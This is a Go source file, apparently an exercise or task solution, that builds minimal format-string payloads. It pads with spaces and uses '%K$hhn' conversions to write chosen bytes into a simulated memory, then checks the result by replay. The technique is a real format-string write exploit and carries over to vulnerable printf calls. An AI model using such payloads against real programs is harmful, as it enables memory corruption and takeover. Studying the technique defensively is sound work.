package netsec

import (
	"bytes"
	"fmt"
	"sort"
	"strconv"
)

// PayloadPlan is a minimal payload together with the replay result it should
// produce.
type PayloadPlan struct {
	Format      []byte
	Writes      []Write
	FinalCount  int
	FinalMemory []byte
}

// Plan computes a minimal payload for the protected memory starting at address
// zero. Targets maps memory offsets to required final byte values.
func Plan(args []uintptr, initial []byte, targets map[int]byte) (*PayloadPlan, error) {
	return PlanAt(0, args, initial, targets)
}

// PlanAt computes a payload for memory beginning at base. Argument values are
// absolute addresses; target keys are offsets from base.
//
// The returned format is optimal in this order: smallest final count, fewest
// writes, then lexicographically smallest format bytes. Each argument is used
// at most once.
func PlanAt(base uintptr, args []uintptr, initial []byte, targets map[int]byte) (*PayloadPlan, error) {
	if len(args) > MaxArgs {
		return nil, fmt.Errorf("too many arguments: %d (maximum %d)", len(args), MaxArgs)
	}
	if len(initial) == 0 || len(initial) > MaxMemoryBytes {
		return nil, fmt.Errorf("memory size %d is outside 1..%d", len(initial), MaxMemoryBytes)
	}

	type selectedWrite struct {
		offset int
		value  byte
		arg    int
	}

	var selected []selectedWrite
	for offset, want := range targets {
		if offset < 0 || offset >= len(initial) {
			return nil, fmt.Errorf("target offset %d is outside memory", offset)
		}
		if initial[offset] == want {
			continue
		}
		arg, ok := smallestArgForOffset(base, args, offset)
		if !ok {
			return nil, fmt.Errorf("target offset %d has no usable argument address", offset)
		}
		selected = append(selected, selectedWrite{offset: offset, value: want, arg: arg})
	}

	if len(selected) == 0 {
		return &PayloadPlan{
			Format:      []byte{},
			Writes:      nil,
			FinalCount:  0,
			FinalMemory: bytes.Clone(initial),
		}, nil
	}

	groups := make([][]selectedWrite, 256)
	for _, write := range selected {
		groups[int(write.value)] = append(groups[int(write.value)], write)
	}

	format := make([]byte, 0, 320)
	previousCount := 0
	for value := 0; value < 256; value++ {
		if len(groups[value]) == 0 {
			continue
		}

		// Ordinary spaces are the lexicographically smallest way to raise the
		// count. They leave the count at exactly the target byte value.
		format = append(format, bytes.Repeat([]byte{' '}, value-previousCount)...)

		group := groups[value]
		sort.Slice(group, func(i, j int) bool {
			left := hhnConversion(group[i].arg)
			right := hhnConversion(group[j].arg)
			return bytes.Compare(left, right) < 0
		})
		for _, write := range group {
			format = append(format, hhnConversion(write.arg)...)
		}
		previousCount = value
	}

	replayed, err := ReplayAt(base, format, args, initial)
	if err != nil {
		return nil, fmt.Errorf("internal error: generated format is invalid: %w", err)
	}
	if replayed.FinalCount != previousCount {
		return nil, fmt.Errorf("internal error: final count %d, want %d", replayed.FinalCount, previousCount)
	}
	if len(replayed.Writes) != len(selected) {
		return nil, fmt.Errorf("internal error: %d writes, want %d", len(replayed.Writes), len(selected))
	}
	for offset, want := range targets {
		if replayed.FinalMemory[offset] != want {
			return nil, fmt.Errorf("internal error: target offset %d is 0x%02x, want 0x%02x",
				offset, replayed.FinalMemory[offset], want)
		}
	}
	for offset, initialValue := range initial {
		if _, isTarget := targets[offset]; isTarget {
			continue
		}
		if replayed.FinalMemory[offset] != initialValue {
			return nil, fmt.Errorf("internal error: non-target offset %d changed", offset)
		}
	}

	return &PayloadPlan{
		Format:      format,
		Writes:      replayed.Writes,
		FinalCount:  replayed.FinalCount,
		FinalMemory: replayed.FinalMemory,
	}, nil
}

// smallestArgForOffset returns the lowest one-based argument number whose
// address maps to offset. The lowest number gives the lexicographically
// smallest %K$hhn conversion when duplicate addresses are available.
func smallestArgForOffset(base uintptr, args []uintptr, offset int) (int, bool) {
	for i, address := range args {
		got, ok := addressOffset(base, address, offset+1)
		if ok && got == offset {
			return i + 1, true
		}
	}
	return 0, false
}

func hhnConversion(arg int) []byte {
	conversion := make([]byte, 0, 8)
	conversion = append(conversion, '%')
	conversion = strconv.AppendInt(conversion, int64(arg), 10)
	conversion = append(conversion, '$', 'h', 'h', 'n')
	return conversion
}
